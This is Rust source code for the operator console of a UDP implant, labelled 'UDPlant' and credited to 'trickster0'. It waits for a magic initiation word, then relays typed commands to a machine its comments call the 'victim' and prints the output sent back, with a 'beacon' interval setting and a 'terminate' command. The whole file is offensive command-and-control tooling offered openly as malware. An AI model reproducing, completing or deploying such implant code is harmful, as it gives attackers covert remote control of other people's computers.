extern crate colored;

use std::net::UdpSocket;
use std::thread::sleep;
use std::time;
use colored::Colorize;
use std::io;
use std::io::Write;

fn main() {
    println!("{}","
    ###########################################################################
    #                  UDPlant - UDP implant made by trickster0               #
    ###########################################################################\r\n".green());
    let mut socket = UdpSocket::bind("0.0.0.0:42303").expect("Socket failed to open.");
    let mut buf = [0;9];
    let _incoming = socket.recv(&mut buf);
    match String::from_utf8_lossy(&buf).as_ref() {
        "magicword" => initiate(&mut socket),
        _ => println!("Wrong initiation code"),
    }

}

fn initiate(socket: &mut UdpSocket) {
    println!("{}", "[+]Connection Initiated.".green());
    let stage1 = "int1".as_bytes();
    socket.send_to(&stage1,"0.0.0.0:33267").expect("Failed to connect on UDP."); //victim's IP
    println!("{}","[+]Implant Armed.".green());
    println!("\r\nCommands:
    ########################################################################
    #    beacon - this command can set the beacon time. Format is seconds. #
    #    EX: beacon 25                                                     #
    #    terminate - closes the client                                     #
    #######################################################################");
    while (true) {
        print!("Agent:~$ ");
        io::stdout().flush().expect("failed to get it");
        let mut input = String::new();
        io::stdin().read_line(&mut input);
        let mut buf = [0;2];
        let incoming1 = socket.recv_from(&mut buf);
        match String::from_utf8_lossy(&buf).as_ref() {
            "GC" => arm(socket, input), 
            _ => println!("Wrongzita"),
        };
    }
}

fn arm(socket: &mut UdpSocket, input: String) {
    socket.send_to(&input.as_bytes(),"0.0.0.0:33267"); //victim's IP
    println!("{}",&input);
    let mut output = [0;100000];
    socket.recv_from(&mut output);
    let my_string = String::from_utf8_lossy(&output);
    println!("{}", &my_string);
}
